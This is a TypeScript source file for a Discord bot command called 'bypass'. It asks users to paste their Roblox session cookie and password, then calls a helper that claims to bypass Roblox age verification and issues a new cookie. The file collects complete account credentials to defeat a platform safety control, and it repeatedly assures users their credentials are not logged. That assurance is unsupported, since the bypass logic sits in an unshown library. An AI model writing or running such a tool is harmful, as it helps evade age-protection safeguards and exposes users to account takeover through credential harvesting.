import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import { buildSuccessEmbed, buildErrorEmbed, buildInvalidCookieEmbed, buildIpLimitEmbed, buildProgressEmbed } from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Bypass Stuff')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption(opt =>
    opt.setName('cookie')
      .setDescription('Insert Your Cookie!')
      .setRequired(true)
  )
  .addStringOption(opt =>
    opt.setName('password')
      .setDescription('Insert Your Password!')
      .setRequired(true)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);

    const validation = await Roblox.validateCookie(rawCookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const emailInfo = await Roblox.fetchEmailInfo(rawCookie);
    if (!emailInfo.verified) {
      const embed = buildSuccessEmbed(
        '✧ **Bypass Result**\n' +
        `────\n` +
        `⭑ **Status:** Success, No Mails Detected!\n` +
        `⭑ **Username:** ${validation.username}\n` +
        `⭑ Your credentials were not logged.`
      );
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = buildProgressEmbed('Sending bypass request...');
    await interaction.editReply({ embeds: [progressEmbed] });

    const bypassResult = await Roblox.bypassAgeVerification(rawCookie, password);
    if (bypassResult.success) {
      const newCookie = bypassResult.newCookie;
      const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
      const embed = buildSuccessEmbed(
        '✧ **Bypass Result**\n' +
        `────\n` +
        `⭑ **Status:** Success\n` +
        `⭑ **Message:** ${bypassResult.message}\n` +
        (newCookie ? `⭑ **New Cookie Issued:** Yes\n` : `⭑ **New Cookie Issued:** No\n`) +
        `⭑ Your credentials were not logged.`
      );
      const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, false) : undefined;
      await interaction.editReply({ embeds: [embed], components: row ? [row] : [] });
    } else {
      if (bypassResult.message === 'Progressing..') {
        const embed = buildProgressEmbed('Bypass in progress... Please wait and check later.');
        await interaction.editReply({ embeds: [embed] });
      } else {
        await interaction.editReply({ embeds: [buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${bypassResult.message}\n⭑ Your credentials were not logged.`)] });
      }
    }
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
  
}

export const bypassCommand: Command = { data, execute, handleButton };